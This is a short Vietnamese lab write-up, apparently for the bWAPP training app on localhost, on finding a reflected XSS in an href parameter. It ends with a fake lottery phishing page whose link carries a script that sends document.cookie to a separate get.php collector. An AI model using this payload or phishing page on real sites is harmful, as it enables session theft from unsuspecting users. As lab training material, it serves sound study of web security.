### Kiểm tra XSS
Nhập tên vào box và xem kết quả trả về

![image](https://github.com/user-attachments/assets/95e333f3-7e97-47fe-8c96-0b2d4262c1f2)

Kết quả trả về là một bảng dù ta nhập bất kì thông tin nào

Thử nhập ```<script>alert("Thiep")</script>``` Kết quả trả về là không tìm thấy tên này

--> Có thể không có cơ chế lọc đầu vào.

![image](https://github.com/user-attachments/assets/df303141-b7a3-47d8-9e6b-7850731b972e)

View source, để ý đến chỗ có phần mình vừa nhập vào

![image](https://github.com/user-attachments/assets/25956aed-4fe2-472c-bdd0-955ab3c3b4b4)

Đoạn js đã được truyền vào nhưng nó không được thực thi là do nó đang nằm trong thẻ <a></a>. Chỉ cần đóng lại và tiêm XSS vào. ( thêm ```>``` hoặc ```</a>``` vào trước đoạn js)

![image](https://github.com/user-attachments/assets/57a19914-9b8b-4616-8bb8-8a954d98a9df)

### Khai thác
File Phishing:

```html
<html>
    <head>
        <title>Lottery</title>
    </head>
    <body>
	    <h1 align="center">CONGRATULATIONS!!!</h1>
	    <h1 align="center">YOU WON!!!</h1>
	    Click this <a href="http://localhost/bwapp/xss_href-2.php?name=><script>window.open(%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&action=vote">link</a> to see your prize
    </body>
</html>
```
